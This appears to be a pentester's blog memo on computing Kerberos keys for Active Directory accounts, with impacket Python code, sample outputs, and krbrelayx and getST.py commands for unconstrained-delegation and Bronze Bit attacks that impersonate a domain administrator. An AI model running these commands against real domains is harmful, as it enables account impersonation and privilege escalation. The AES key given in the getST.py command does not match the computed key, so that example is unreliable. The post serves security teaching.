---
layout: post
title: "A Note on Calculating Kerberos Keys for AD Accounts"
date: 2021-05-21 23:00:00 +0300
author: snovvcrash
tags: [internal-pentest, active-directory, kerberos, krbrelayx, python, impacket, bronze-bit]
---

A short memo on how to properly calculate Kerberos keys for different types of Active Directory accounts in context of decrypting TGS tickets during delegation attacks.

<!--cut-->

![banner.png](/assets/images/calculating-kerberos-keys/banner.png)
{:.center-image}

In order to successfully decrypt service TGS we must calculate its Kerberos key first. To do this we should obtain account's password and form the salt:

* For a user/service account the salt is built as uppercase Kerberos realm name + case sensitive username.
* For a computer account the salt is built as uppercase Kerberos realm name + the word `host` + lowercase FQDN hostname.

Let's say the domain name (Kerberos realm) is `megacorp.local`, then for user `Bob_Adm` the salt will be `MEGACORP.LOCALBob_Adm`, and for computer `SRV01` the salt will be `MEGACORP.LOCALhostsrv01.megacorp.local`.

Based on the "Relaying" Kerberos attack [toolkit](https://github.com/dirkjanm/krbrelayx) (by [@dirkjanm](https://twitter.com/_dirkjan)) the keys can be calculated with the following Python code using [impacket](https://github.com/SecureAuthCorp/impacket):

```python
#!/usr/bin/env python3

from binascii import unhexlify, hexlify

from impacket.krb5 import constants
from impacket.krb5.crypto import Key, string_to_key
from Cryptodome.Hash import MD4

allciphers = {
	'rc4_hmac_nt': int(constants.EncryptionTypes.rc4_hmac.value),
	'aes128_hmac': int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
	'aes256_hmac': int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
}


def printKerberosKeys(password, salt):
	for name, cipher in allciphers.items():
		if cipher == 23:
			md4 = MD4.new()
			md4.update(password)
			key = Key(cipher, md4.digest())
		else:
			fixedPassword = password.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
			key = string_to_key(cipher, fixedPassword, salt)

		print(f'    * {name}: {hexlify(key.contents).decode("utf-8")}')


def printMachineKerberosKeys(domain, hostname, hexpassword):
	salt = b'%shost%s.%s' % (domain.upper().encode('utf-8'), hostname.lower().encode('utf-8'), domain.lower().encode('utf-8'))
	rawpassword = unhexlify(hexpassword)
	print(f'{domain.upper()}\\{hostname.upper()}$')
	print(f'    * Salt: {salt.decode("utf-8")}')
	printKerberosKeys(rawpassword, salt)


def printUserKerberosKeys(domain, username, rawpassword):
	salt = b'%s%s' % (domain.upper().encode('utf-8'), username.encode('utf-8'))
	rawpassword = rawpassword.encode('utf-16-le')
	print(f'{domain.upper()}\\{username}')
	print(f'    * Salt: {salt.decode("utf-8")}')
	printKerberosKeys(rawpassword, salt)
```

When performing the ["Relaying" Kerberos attack](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/) against an unconstrained delegation **computer** account, the adversary will use krbrelayx.py as follows:

```console
# Calculate the AES key automatically
~$ krbrelayx.py --krbpass 'Passw0rd!' --krbsalt 'MEGACORP.LOCALhostsrv01.megacorp.local'
# Pre-calculate the AES key and pass it as an argument
~$ krbrelayx.py -aesKey 4e70fdfa30728cb202aa6b169627078546a3a30ddf0e655f493ae372dd30fa57
```

```python
printMachineKerberosKeys(
	domain='megacorp.local',
	hostname='SRV01',
	hexpassword='16ef05840eedc3af56b2cd75bba16ace855271729f0265d6638bc0a5097b095e8abd316f9f89da445fa16907f04cde46d847291060185437a67d10547cdebbea138846fe019a63c3e91cf1ed416f5b6f05cdcc03b772c5d68a6d71c05130c7e3df1c4760fe72b82fb3441a1ca43d5873028b3bb671a51f4ceada3bf063c8742bd24587c66c1ad3e0a1e34b566b0917209d54345bc0ccdb81a0cfecedad38fc2fb98990f3b45f70dd18e64928fbb9c41c5f284b5748669cf3369146626cf0aafaf43f24d0ac927ff499e0f5dc06c1be1d4d8ff5006c581b0d2e0b188156c680fec864d5215b2d17864096b4d0a59e705d'
)

"""
MEGACORP.LOCAL\SRV01$
    * Salt: MEGACORP.LOCALhostsrv01.megacorp.local
    * rc4_hmac_nt: 1b8112a5c2eb2c45ba045efdca7c4848
    * aes128_hmac: 7c91cca5c6a7c1f961d977a7f3332273
    * aes256_hmac: 4e70fdfa30728cb202aa6b169627078546a3a30ddf0e655f493ae372dd30fa57
"""
```

When performing this attack against an unconstrained delegation **user** account, the adversary does not need to calculate the salt because the ticket it encrypted with RC4 by default (not salted NT hash used as key):

```console
~$ krbrelayx.py -hashes :fc525c9683e8fe067095ba2ddc971889
```

```python
printUserKerberosKeys(
	domain='megacorp.local',
	username='Bob_Adm',
	rawpassword='Passw0rd!'
)

"""
MEGACORP.LOCAL\Bob_Adm
    * Salt: MEGACORP.LOCALBob_Adm
    * rc4_hmac_nt: fc525c9683e8fe067095ba2ddc971889
    * aes128_hmac: 79505a4518150188087e722dec3b2567
    * aes256_hmac: b628f4549bd8c9e18b9573075a2db50a08aff7982be3185923af87ec2bffddc5
"""
```

On the other hand, when performing the [Bronze Bit attack](https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/) (by [@jakekarnes42](https://github.com/jakekarnes42)), the adversary leverages a fake service (see [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)) account to request the ticket which brings back AES encryption with salt (PBKDF2 from salted password used as key). Despite the fact that Powermad's function for adding fake accounts is called `New-MachineAccount`, it's actually a **service** account and the Kerberos keys should be calculated with `printUserKerberosKeys` function in terms of this note:

```console
PS > New-MachineAccount -MachineAccount fakemachine -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
~$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' megacorp.local/fakemachine -hashes :fc525c9683e8fe067095ba2ddc971889 -aesKey 211e8e3134ed797b0a2bf6c36d1a966b3bed2b24e4aaa9eceed23d0abf659e98 -force-forwardable
```

```python
printUserKerberosKeys(
	domain='megacorp.local',
	username='fakemachine',
	rawpassword='Passw0rd!'
)

"""
MEGACORP.LOCAL\fakemachine
    * Salt: MEGACORP.LOCALfakemachine
    * rc4_hmac_nt: fc525c9683e8fe067095ba2ddc971889
    * aes128_hmac: 3a2a5d368927e4ac0948c76b2e5e998b
    * aes256_hmac: de933a0f9cabde83ba6ab195af8ecb8af982b50992606caab74568cf47ca4cd3
"""
```

The same calculation can be done with [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372), [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/ConvertTo-KerberosKey.md#convertto-kerberoskey) or [Mimikatz](https://github.com/gentilkiwi/mimikatz) `kerberos::hash` function.
